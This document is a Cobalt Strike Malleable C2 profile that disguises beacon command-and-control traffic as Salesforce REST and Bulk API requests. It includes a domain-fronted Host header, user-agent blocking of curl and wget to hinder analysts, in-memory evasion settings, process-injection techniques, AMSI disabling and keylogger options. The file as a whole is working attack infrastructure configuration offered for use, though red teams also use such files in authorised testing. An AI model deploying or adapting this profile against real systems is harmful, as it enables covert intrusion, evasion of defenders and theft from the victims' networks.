#salesforce api profiles
#GET traffic -> https://trailhead.salesforce.com/en/content/learn/modules/api_basics/api_basics_rest
#POST traffic -> https://trailhead.salesforce.com/en/content/learn/modules/api_basics/api_basics_bulk
#xx0hcd

###Global Options###
set sample_name "salesforce_api.profile";

set sleeptime "38500";
set jitter    "27";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (XHTML, like Gecko) Chrome/87.0.4280.89 Safari/537.36";

set host_stage "false";

###DNS options###
dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs_##";
set pipename_stager "scerpc_##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###SSL Options###
#https-certificate {
#    set keystore "";
#    set password "";
#}

https-certificate {
    set C "US";
    set CN "whatever.com";
    set L "California";
    set O "whatever LLC.";
    set OU "local.org";
    set ST "CA";
    set validity "365";
}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";

    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

###HTTP-GET Block###
http-get {

    set uri "/services/data/v36.0/sobjects/account/describe";
    
    client {

        header "Content-Type" "application/json; charset=UTF-8";
        header "Accept" "application/json";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Connection" "close";

	   
    metadata {
        base64;
        #the space in prepend causes a c2lint fail, refer -> https://blog.cobaltstrike.com/2018/06/04/broken-promises-and-malleable-c2-profiles/
        prepend "Bearer_";
        header "Authorization";

    }

    }

    server {
    
        header "Set-Cookie" "BrowserId=SnCOoGTQFfu5g";
        header "Sforce-Limit-Info" "api-usage=3/15000";
        header "org.eclipse.jetty.server.include.ETag" "120dfb8e";
        header "Content-Type" "application/json;charset=UTF-8";
        header "ETag" "120dfb8e-gzip";
 
        output {

            base64;
            
            prepend "{
  \"actionOverrides\" : [ ],
  \"activateable\" : false.
  \"childRelationship\" : [ {
    \"cascadeDelete\" : false,
    \"childObject\" : \"Account\",
    \"deprecatedAndHidden\" : false,
    \"field\" : \"";
            
            append "\n\"junctionIdListName\" : null,
     \"junctionReferenceTo\" : [ ],
     \"relationshipName\" : \"ChildAccounts\",
     \"restrictedDelete\" : false
   }";      
	  

            print;
        }
    }
}



###HTTP-Post Block###
http-post {
    
    set uri "/services/data/v41.0/jobs/ingest";
    #set verb "GET";
    set verb "POST";

    client {

	header "Host" "mscrl1.azureedge.net";
	header "Accept" "*/*";
	header "Accept-Language" "en";
	header "Connection" "close";
        
        output {
            base64url;
	    prepend "{
  \"operation\" : \"insert\",
  \"object\" :";
  
  	    append "\n\"contentType\" : \"CSV\",
  \"lineEnding\" : \"CRLF\"
}";
	    
	    print;
        }

        id {
	    base64url;
	    prepend "Bearer_";
            header "Authorization";

        }
    }

    server {
    
        header "Strict-Transport-Security" "max-age=31536000; includeSubDomains";
        header "X-Content-Type-Options" "nosniff";
        header "X-XSS-Protection" "1; mode=block";
        header "Content-Security-Policy" "upgrade-insecure-requests";
        header "Cache-Control" "no-cache,must-revalidate,max-age=0,no-store,private";
        header "Set-Cookie" "BrowserId=SnCOoGTQFfu5g";
        header "Sforce-Limit-Info" "api-usage=3/15000";
        header "Content-Type" "text/csv";
        header "Vary" "Accept-Encoding";

        output {
            netbios;
            prepend "\"sf_id\" : {";
            prepend "\"001B000000XKk9YIAT\", \"true\",\"Bulk API Account4\"";
            prepend "\"001B000000XKk9YIAD\", \"true\",\"Bulk API Account2\"";
	    prepend "\"sf_Id\", \"sf_Created\",\"Name\"";
	    
	    append "}\n";
	    append "\n\"001B000000XKk9aIAD\", \"true\",\"Bulk API Account3\"";
	    append "\n\"001B000000XKk9aIAT\", \"true\",\"Bulk API Account4\"";

            print;
        }
    }
}



###HTTP-Stager Block###
http-stager {

    set uri_x86 "/services/data/v41.2/jobs/ingest";
    set uri_x64 "/services/data/v41.1/jobs/ingest";

    client {
        
	header "Content-Type" "application/json; charset=UTF-8";
        header "Accept" "application/json";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Connection" "close";
    }

    server {
        
        header "Set-Cookie" "BrowserId=SnCOoGTQFfu5g";
        header "Sforce-Limit-Info" "api-usage=3/15000";
        header "org.eclipse.jetty.server.include.ETag" "120dfb8e";
        header "Content-Type" "application/json;charset=UTF-8";
        header "ETag" "120dfb8e-gzip";
	
	output {
	
	    prepend "content=";
	    
	    append "</script>\n";
	    print;
	}

    }
}


###Malleable PE/Stage Block###
stage {
    set checksum       "0";
    set compile_time   "09 Dec 2094 15:58:28";
    set entry_point    "38496";
    set image_size_x86 "331776";
    set image_size_x64 "331776";
    set name           "ACTIONCENTER.dll";

    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
      
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";
    
    set sleep_mask "true";
    
    set smartinject "true";

    #set module_x86 "wwanmm.dll";
    #set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";

}
